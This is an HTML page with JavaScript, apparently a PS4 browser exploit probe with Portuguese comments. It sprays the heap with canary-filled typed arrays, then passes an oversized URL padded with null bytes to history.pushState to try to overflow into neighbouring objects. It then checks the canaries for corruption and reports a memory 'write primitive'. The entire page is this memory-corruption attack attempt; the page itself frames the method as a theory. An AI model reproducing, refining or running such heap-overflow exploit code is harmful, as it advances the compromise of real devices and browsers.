<!DOCTYPE html>
<html>
<head>
    <title>PS4 Heap Compressor (Stress Test)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .win { color: #ffff00; font-weight: bold; background: #222; }
    </style>
</head>
<body>

<h1>Heap Compressor: Stress & Overwrite</h1>
<p>Teoria: "Mais Estresse = Mais Bytes Escritos"</p>
<button onclick="startCompression()">INICIAR COMPRESSÃO MÁXIMA</button>
<div id="log">Pronto para estressar...</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = [];
    var spray = [];

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#00ff00';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    async function startCompression() {
        log("=== FASE 1: AQUECIMENTO DO MOTOR ===");
        
        // 1. Fragmentação e Desfragmentação Cíclica
        // Aloca e desaloca rápido para forçar o GC a trabalhar pesado
        for(let cycle = 1; cycle <= 3; cycle++) {
            log(`[Ciclo ${cycle}] Bombeando memória...`);
            let pump = [];
            // Enche
            for(let i=0; i<10000; i++) pump.push(new Uint32Array(1024));
            await wait(100);
            // Esvazia
            pump = [];
            await wait(200); // Espera GC
        }

        log("=== FASE 2: PREPARAÇÃO DO SANDUÍCHE ===");
        // Estrutura: [LIXO] [ALVO] [VÍTIMA] [ALVO] [VÍTIMA] ...
        // Queremos que o history.pushState caia num [ALVO] e transborde para a [VÍTIMA]
        
        log("Alocando vítimas (Canários)...");
        victims = [];
        spray = [];

        for(let i=0; i<2000; i++) {
            // Vítima: Um Array de Inteiros (Uint32Array)
            // Preenchemos com 0xAABBCCDD para detectar mudanças fáceis
            let v = new Uint32Array(32); 
            v.fill(0xAABBCCDD);
            victims.push(v);

            // Spray: Objetos para ocupar espaço
            spray.push(new ArrayBuffer(1024));
        }

        log("=== FASE 3: O ATAQUE DE ESTRESSE ===");
        log("Tentando escrever o máximo de Zeros possível...");

        // Vamos tentar escrever de 32 até 100 bytes
        // Se conseguirmos escrever 64 bytes, chegamos no CONTEÚDO da vítima
        const sizes = [32, 48, 64, 80, 96, 128];

        for (let size of sizes) {
            try {
                // Cria payload de zeros
                let zeros = "\x00".repeat(size);
                
                // Base + Zeros
                let payload = "/" + "A".repeat(BASE_OFFSET) + zeros;
                
                // Nome único para forçar nova entrada
                history.pushState({}, `compress_${size}`, payload);
                
                log(`[+] Escrita de ${size} bytes ACEITA pelo navegador!`, 'win');
                
                // CHECAGEM IMEDIATA
                checkVictims(size);

            } catch(e) {
                log(`[-] Limite atingido em ${size} bytes (Crash/Block).`);
            }
            
            // Pausa para não travar a UI
            await wait(500);
        }
        
        log("Teste finalizado.");
    }

    function checkVictims(attackSize) {
        let corruptedCount = 0;
        
        // Varre as vítimas procurando zeros onde deveria ter 0xAABBCCDD
        for(let i=0; i<victims.length; i++) {
            let v = victims[i];
            
            // Checa os primeiros elementos
            // Se o header foi corrompido, acessar 'v[0]' pode crashar ou dar erro, 
            // então usamos try/catch
            try {
                // Se encontrarmos ZEROS no conteúdo, significa que o overflow 
                // passou pelo header e chegou nos dados!
                if (v[0] === 0 || v[1] === 0) {
                    log(`!!! JACKPOT !!! Vítima ${i} corrompida! Conteúdo zerado!`, 'win');
                    log(`    Isso confirma WRITE PRIMITIVE (Escrita de Memória).`, 'win');
                    corruptedCount++;
                }
                // Se o tamanho do array mudou (Header corrupto)
                else if (v.length !== 32) {
                    log(`[!] Header Corrompido: Vítima ${i} tamanho mudou para ${v.length}`, 'win');
                    corruptedCount++;
                }
            } catch(e) {
                // Se der erro ao ler, também é sinal de header corrompido
                // log(`[?] Vítima ${i} ilegível (Header destruído?)`);
            }
        }

        if (corruptedCount > 0) {
            alert(`SUCESSO CRÍTICO: ${corruptedCount} objetos corrompidos com ${attackSize} bytes!`);
        }
    }
</script>

</body>
</html>
